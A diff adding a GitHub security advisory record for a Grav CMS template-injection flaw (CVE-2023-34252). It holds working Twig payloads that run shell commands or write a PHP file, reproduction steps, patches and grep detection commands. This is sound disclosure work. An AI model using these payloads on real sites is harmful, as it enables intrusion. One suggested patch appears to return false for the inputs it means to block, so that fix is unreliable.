@@ -1,0 +1,86 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-96xv-rmwj-6p9w",
+  "modified": "2023-06-16T19:36:39Z",
+  "published": "2023-06-16T19:36:39Z",
+  "aliases": [
+    "CVE-2023-34252"
+  ],
+  "summary": "Grav Server-side Template Injection (SSTI) via Twig Default Filters",
+  "details": "Hi,\n\nactually we have sent the bug report to [security@getgrav.org](mailto:security@getgrav.org) on 27th March 2023 and on 10th April 2023.\n\n# Grav Server-side Template Injection (SSTI) via Insufficient Validation in filterFilter\n\n## Summary:  \n| **Product**             | Grav CMS                                      |\n| ----------------------- | --------------------------------------------- |\n| **Vendor**              | Grav                                          |\n| **Severity**            | High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution |\n| **Affected Versions**   | <= [v1.7.40](https://github.com/getgrav/grav/tree/1.7.40) (Commit [685d762](https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61)) (Latest version as of writing) |\n| **Tested Versions**     | v1.7.40                                       |\n| **Internal Identifier** | STAR-2023-0007                                |\n| **CVE Identifier**      | TBD                                           |\n| **CWE(s)**              | CWE-20: Improper Input Validation, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |\n\n## CVSS3.1 Scoring System:  \n**Base Score:** 7.2 (High)  \n**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`  \n| **Metric**                   | **Value** |\n| ---------------------------- | --------- |\n| **Attack Vector (AV)**       | Network   |\n| **Attack Complexity (AC)**   | Low       |\n| **Privileges Required (PR)** | High      |\n| **User Interaction (UI)**    | None      |\n| **Scope (S)**                | Unchanged |\n| **Confidentiality \\(C)**     | High      |\n| **Integrity (I)**            | High      |\n| **Availability (A)**         | High      |\n\n## Product Overview:  \nGrav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.\n\n## Vulnerability Summary:  \nThere is a logic flaw in the `GravExtension.filterFilter()` function whereby validation against a denylist of unsafe functions is only performed when the argument passed to filter is a string. However, passing an array as a callable argument allows the validation check to be skipped. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.\n\n## Vulnerability Details:  \nThe vulnerability can be found in the `GravExtension.filterFilter()` function declared in [`/system/src/Grav/Common/Twig/Extension/GravExtension.php`](https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698):\n~~~php\n...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n    \n    /**\n     * Return a list of all filters.\n     *\n     * @return array\n     */\n    public function getFilters(): array\n    {\n        return [\n            ...\n            \n            // Security fix\n            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' => true]),\n        ];\n    }\n\n    ...\n\n    /**\n     * @param Environment $env\n     * @param array $array\n     * @param callable|string $arrow\n     * @return array|CallbackFilterIterator\n     * @throws RuntimeError\n     */\n    function filterFilter(Environment $env, $array, $arrow)\n    {\n        if (is_string($arrow) && Utils::isDangerousFunction($arrow)) { // [1]\n            throw new RuntimeError('Twig |filter(\"' . $arrow . '\") is not allowed.');\n        }\n\n        return \\twig_array_filter($env, $array, $arrow); // [2]\n    }\n}\n~~~\n\nAt [1], the `$arrow` parameter contains the argument supplied to the filter. For example, it may refer to `\"funcname\"` in `{{ array|filter(\"funcname\") }}` or the closure (a.k.a. arrow function) `el => el != 'exclude'` in `{{ array|filter(el => el != 'exclude') }}`. Observe that `Utils::isDangerousFunction($arrow)` is only invoked if `$arrow` is a string. As such, non-string arguments may be passed to `twig_array_filter()` at [2] due to the absence of type enforcement at [1].\n\nThe implementation of the `twig_array_filter()` function can be found in [/src/Extension/CoreExtension.php](https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php) within Twig's codebase:\n~~~php\nfunction twig_array_filter(Environment $env, $array, $arrow)\n{\n    if (!twig_test_iterable($array)) {\n        throw new RuntimeError(sprintf('The \"filter\" filter expects an array or \"Traversable\", got \"%s\".', \\is_object($array) ? \\get_class($array) : \\gettype($array)));\n    }\n\n    if (!$arrow instanceof Closure && $env->hasExtension('\\Twig\\Extension\\SandboxExtension') && $env->getExtension('\\Twig\\Extension\\SandboxExtension')->isSandboxed()) { // [3]\n        throw new RuntimeError('The callable passed to \"filter\" filter must be a Closure in sandbox mode.');\n    }\n\n    if (\\is_array($array)) {\n        if (\\PHP_VERSION_ID >= 50600) {\n            return array_filter($array, $arrow, \\ARRAY_FILTER_USE_BOTH); // [4]\n        }\n\n        return array_filter($array, $arrow);\n    }\n\n    // the IteratorIterator wrapping is needed as some internal PHP classes are \\Traversable but do not implement \\Iterator\n    return new \\CallbackFilterIterator(new \\IteratorIterator($array), $arrow);\n}\n~~~\n\nAt [3], a runtime error is thrown if `$arrow` is not a closure and Twig sandbox is enabled. However, since Grav does not use the Twig Sandbox extension, the check passes successfully even when `$arrow` is not a closure. Subsequently at [4], `array_filter()` is invoked with the user-controlled `$array` input and `$arrow` parameter.\n\nNote that the method signature of `array_filter()` is as follows:\n~~~php\narray_filter(array $array, ?callable $callback = null, int $mode = 0): array\n~~~\n\nA common mistake that developers make is assuming that the `callable` type refers to a `string` type. This is untrue, and it is [well documented in the PHP Manual](https://www.php.net/manual/en/language.types.callable.php):\n> A method of an instantiated object is passed as an **array containing an object at index 0 and the method name at index 1**. Accessing protected and private methods from within a class is allowed.\n> Static class methods can also be passed without instantiating an object of that class by either, **passing the class name instead of an object at index 0, or passing `ClassName::methodName`**.\n\nThis means that all of the following method calls are valid:\n~~~php\n// Type 1: Simple callback -- invokes system(\"id\")\narray_filter(array(\"id\"), \"system\");\n\n// Type 2: Static class method call -- invokes Class::staticMethod($arg)\narray_filter(array($arg), array(\"Class\", \"staticMethod\"));\narray_filter(array($arg), array(\"Class::staticMethod\")); // same as above\n\n// Type 3: Object method call -- invokes $obj->method($arg)\narray_filter(array($arg), array($obj, \"method\"));\n~~~\n\nGoing back to [1], if `$arrow` is an `array` instead of a `string` or `closure`, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Grav's codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:\n~~~twig\n// Gadget 1: Using \\Grav\\Common\\Utils::arrayFilterRecursive() within Grav's codebase to invoke system(\"id\"):\n{% set id = {'id': 0} %}\n{{ {'system': id} | filter('\\\\Grav\\\\Common\\\\Utils', 'arrayFilterRecursive') }}\n\n// Gadget 2: Using \\Symfony\\Component\\VarDumper\\Vardumper::setHandler() and \\Symfony\\Component\\VarDumper\\Vardumper::dump() to invoke system(\"id\"):\n{{ ['system'] | filter(['\\\\Symfony\\\\Component\\\\VarDumper\\\\VarDumper', 'setHandler'])}}\n{{ ['id'] | filter(['\\\\Symfony\\\\Component\\\\VarDumper\\\\VarDumper', 'dump']) }}\n\n// Gadget 3: Using \\RocketTheme\\Toolbox\\File\\File::instance() in Grav's default theme to perform arbitrary file write to rce.php in the webroot:\n{{ (['rce.php'] | map(['\\\\RocketTheme\\\\Toolbox\\\\File\\\\File', 'instance']))[0].save('<?php echo phpinfo(); ') }}\n\n// Gadget 4: Using \\Symfony\\Component\\Process\\Process::fromShellCommandline() to invoke system(\"id\"):\n{{ {'/':'sleep 3'} | map(['\\\\Symfony\\\\Component\\\\Process\\\\Process', 'fromShellCommandline']) | map(e => e.run()) | print_r }}\n~~~\n\n## Exploit Conditions:    \nThis vulnerability can be exploited if the attacker has access to:\n1. an administrator account, or\n2. a non-administrator, user account that are granted the following permissions:\n    - login access to Grav admin panel, and\n    - page creation or update rights\n\n## Reproduction Steps:  \n1. Log in to Grav Admin using an administrator account.\n2. Navigate to `Accounts > Add`, and ensure that the following permissions are assigned when creating a new low-privileged user:\n    * Login to Admin - Allowed\n    * Page Update - Allowed\n3. Log out of Grav Admin, and log back in using the account created in step 2.\n4. Navigate to `http://<grav_installation>/admin/pages/home`.\n5. Click the `Advanced` tab and select the checkbox beside `Twig` to ensure that Twig processing is enabled for the modified webpage.\n6. Under the `Content` tab, insert the following payload within the editor:\n   ~~~twig\n   // Gadget 1: Using \\Grav\\Common\\Utils::arrayFilterRecursive() within Grav's codebase to invoke system(\"id\"):\n   {% set id = {'id': 0} %}\n   {{ {'system': id} | filter('\\\\Grav\\\\Common\\\\Utils', 'arrayFilterRecursive') }}\n   ~~~\n7. Click the Preview button. Observe that the output of the `id` shell command is returned in the preview.\n\n## Suggested Mitigations:  \nPatch the logic flaw in the `GravExtension.filterFilter()` function declared in `/system/src/Grav/Common/Twig/Extension/GravExtension.php` to ensure that the `$arrow` paramater passed to the `filterFilter()` function must either be a `string` or an arrow function as such:\n~~~diff php\n...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n\n    /**\n     * @param Environment $env\n     * @param array $array\n     * @param callable|string $arrow\n     * @return array|CallbackFilterIterator\n     * @throws RuntimeError\n     */\n    function filterFilter(Environment $env, $array, $arrow)\n    {\n-       if (is_string($arrow) && Utils::isDangerousFunction($arrow)) {\n+       if (!$arrow instanceof Closure && !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\n            throw new RuntimeError('Twig |filter(\"' . $arrow . '\") is not allowed.');\n        }\n\n        return \\twig_array_filter($env, $array, $arrow);\n    }\n}\n~~~\n\n`Utils::isDangerousFunction()` in [/system/src/Grav/Common/Utils.php](https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074) should also be patched to prevent static class methods from being invoked. For example,\n~~~diff php\n...\nabstract class Utils\n{\n    ...\n    /**\n     * @param string $name\n     * @return bool\n     */\n    public static function isDangerousFunction(string $name): bool\n    {\n        ...\n\n+       if (is_array($name) || strpos($name, \":\") !== false) {\n+           return false;\n+       }\n\n        if (in_array($name, $commandExecutionFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $codeExecutionFunctions)) {\n            return true;\n        }\n\n        if (isset($callbackFunctions[$name])) {\n            return true;\n        }\n\n        if (in_array($name, $informationDiscosureFunctions)) {\n            return true;\n        }\n\n        if (in_array($name, $otherFunctions)) {\n            return true;\n        }\n\n        return static::isFilesystemFunction($name);\n    }\n    ...\n}\n~~~\n\nEnd users should also ensure that `twig.undefined_functions` and `twig.undefined_filters` properties in `/path/to/webroot/system/config/system.yaml` configuration file are set to `false` to disallow Twig from treating undefined filters/functions as PHP functions and executing them.\n\n## Detection Guidance:  \nThe following strategies may be used to detect potential exploitation attempts.\n1. Searching within Markdown pages using the following shell command:  \n   `grep -Priz -e '\\|\\s*(filter|map|reduce)\\s*\\(' /path/to/webroot/user/pages/`\n2. Searching within Doctrine cache data using the following shell command:  \n   `grep -Priz -e '\\|\\s*(filter|map|reduce)\\s*\\('  --include '*.doctrinecache.data' /path/to/webroot/cache/`\n3. Searching within Twig cache using the following shell command:  \n   `grep -Priz -e 'twig_array_(filter|map|reduce)' /path/to/webroot/cache/twig/`\n4. Searching within compiled Twig template files using the following shell command:  \n   `grep -Priz -e '\\|\\s*(filter|map|reduce)\\s*\\(' /path/to/webroot/cache/compiled/files/`\n\nNote that it is not possible to detect indicators of compromise reliably using the Grav log file (located at `/path/to/webroot/logs/grav.log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.\n\n## Credits:  \nNgo Wei Lin ([@Creastery](https://twitter.com/Creastery)) & Wang Hengyue ([@w_hy_04](https://twitter.com/w_hy_04)) of STAR Labs SG Pte. Ltd. ([@starlabs_sg](https://twitter.com/starlabs_sg))\n\nKindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  \n1. **CVE-2023-30595**\n    Server-side Template Injection (SSTI) in getgrav/grav <= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in `GravExtension.filterFilter()` and to achieve remote code execution via usage of fully-qualified names, supplied as arrays of strings, when referencing callables. This is a bypass of CVE-2022-2073.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.42"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-96xv-rmwj-6p9w"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34252"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-1336",
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-06-16T19:36:39Z",
+    "nvd_published_at": "2023-06-14T22:15:09Z"
+  }
+}
